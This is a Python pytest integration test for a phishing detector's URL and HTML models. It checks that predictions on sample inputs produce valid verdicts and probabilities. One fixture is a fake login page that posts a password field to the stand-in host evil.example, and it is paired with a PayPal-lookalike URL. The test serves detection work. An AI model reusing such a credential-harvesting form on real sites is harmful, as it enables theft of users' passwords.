"""Integration test against the REAL .joblib models.

Skipped automatically if the model files are not present (e.g. CI without the
large binaries). Verifies the full extract -> load -> predict_proba -> fuse path
actually runs and produces well-formed output.
"""

from pathlib import Path

import pytest

from app import predictor
from app.config import get_settings
from app.model_loader import HTML_MODEL, URL_MODEL

_models_dir = Path(get_settings().ml_models_dir)
_have_models = (_models_dir / URL_MODEL).is_file() and (_models_dir / HTML_MODEL).is_file()

pytestmark = pytest.mark.skipif(
    not _have_models,
    reason="real .joblib models not present in ML_MODELS_DIR",
)


def test_real_prediction_url_only():
    result = predictor.predict("https://example.com", dom_html=None)

    assert result["verdict"] in {"safe", "suspicious", "phishing"}
    assert 0.0 <= result["combined_phishing_probability"] <= 1.0
    assert result["url_only_fallback"] is True
    assert result["html"] is None
    assert len(result["features"]["url"]) > 0


def test_real_prediction_with_dom():
    html = (
        "<html><head><title>Login</title></head>"
        "<body><form action='http://evil.example/submit'>"
        "<input type='password' name='pw'></form></body></html>"
    ) * 5  # ensure it clears the min-DOM threshold

    result = predictor.predict("http://paypal-secure-login.example/account/verify", dom_html=html)

    assert result["verdict"] in {"safe", "suspicious", "phishing"}
    assert result["url_only_fallback"] is False
    assert result["html"] is not None
    assert 0.0 <= result["url"]["phishing_probability"] <= 1.0
    assert 0.0 <= result["html"]["phishing_probability"] <= 1.0
    assert len(result["features"]["html"]) == 69
